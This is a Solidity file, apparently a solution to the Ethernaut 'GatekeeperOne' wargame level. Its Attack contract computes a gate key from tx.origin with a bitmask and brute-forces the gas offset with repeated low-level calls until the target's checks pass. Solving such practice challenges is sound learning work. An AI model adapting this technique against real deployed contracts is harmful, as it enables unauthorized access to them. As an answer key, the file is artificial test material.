// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "forge-std/console.sol";

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack{
   
    address instance = 0xA471f4FF009Fd261E27272a631c2C9A15152Dd8f;
    GatekeeperOne gatekeeper = GatekeeperOne(instance);
    function exploit() external{
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                console.log("i:", i);
                break;
            }
        }
    }

}